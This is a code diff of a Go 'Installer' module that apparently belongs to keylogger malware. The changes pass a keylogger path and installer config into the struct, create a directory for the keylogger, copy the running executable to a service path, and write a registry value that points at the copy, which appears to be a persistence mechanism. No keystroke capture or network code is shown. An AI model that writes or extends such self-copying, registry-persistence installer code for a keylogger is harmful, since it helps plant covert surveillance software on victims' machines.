@@ -15,15 +15,17 @@ import (
 /*
 Create <Installer> - init Installer structure
 	Returns <*Installer>:
-		1. Structure pointer
+		1. object's pointer
 	Args:
-		1. cfg <config.Cfg> - service's config
+		1. klPath <string> - keylogger's path
+		2. cfgInstaller <config.Installer> - Installer's config
 */
-func (i *Installer) Create(cfg config.Cfg) *Installer {
+func (i *Installer) Create(klPath string, cfgInstaller config.Installer) *Installer {
 	i = &Installer{
 		lc:           "INSTALLER",
 		registryInst: new(registry.Registry).Create(),
-		cfg:          cfg,
+		cfgInstaller: cfgInstaller,
+		klPath:       klPath,
 	}
 
 	return i
@@ -45,26 +47,26 @@ func (i *Installer) Run() bool {
 		return false
 	}
 
-	if err := os.MkdirAll(filepath.Dir(i.cfg.Installer.ServicePath), os.ModePerm); err != nil {
+	if err := os.MkdirAll(filepath.Dir(i.cfgInstaller.ServicePath), os.ModePerm); err != nil {
 		logger.ErrorJ(i.lc, fmt.Sprint("Error make service's temp's directory: ", err.Error()))
 		return false
 	}
 
-	if err := os.MkdirAll(filepath.Dir(i.cfg.Keylogger.Path), os.ModePerm); err != nil {
+	if err := os.MkdirAll(filepath.Dir(i.klPath), os.ModePerm); err != nil {
 		logger.ErrorJ(i.lc, fmt.Sprint("Error make keylogger's temp's directory: ", err.Error()))
 		return false
 	}
 
-	if err := i.copyFiles(os.Args[0], i.cfg.Installer.ServicePath); err != nil {
+	if err := i.copyFiles(os.Args[0], i.cfgInstaller.ServicePath); err != nil {
 		return false
 	}
 
-	if err := i.registryInst.SetStringValue(i.cfg.Installer.RegPath,
-		i.cfg.Installer.RegName, i.cfg.Installer.ServicePath); err != nil {
+	if err := i.registryInst.SetStringValue(i.cfgInstaller.RegPath,
+		i.cfgInstaller.RegName, i.cfgInstaller.ServicePath); err != nil {
 		return false
 	}
 
-	logger.InfoJ(i.lc, fmt.Sprint("Service has been installed to ", i.cfg.Installer.ServicePath))
+	logger.InfoJ(i.lc, fmt.Sprint("Service has been installed to ", i.cfgInstaller.ServicePath))
 
 	return true
 }
@@ -108,12 +110,12 @@ isInstalled <Installer> - service installation check
 		1. Is installed
 */
 func (i *Installer) isInstalled() bool {
-	value, err := i.registryInst.GetStringValue(i.cfg.Installer.RegPath, i.cfg.Installer.RegName)
+	value, err := i.registryInst.GetStringValue(i.cfgInstaller.RegPath, i.cfgInstaller.RegName)
 	if err != nil {
 		return false
 	}
 
-	if value != i.cfg.Installer.ServicePath {
+	if value != i.cfgInstaller.ServicePath {
 		return false
 	}
 
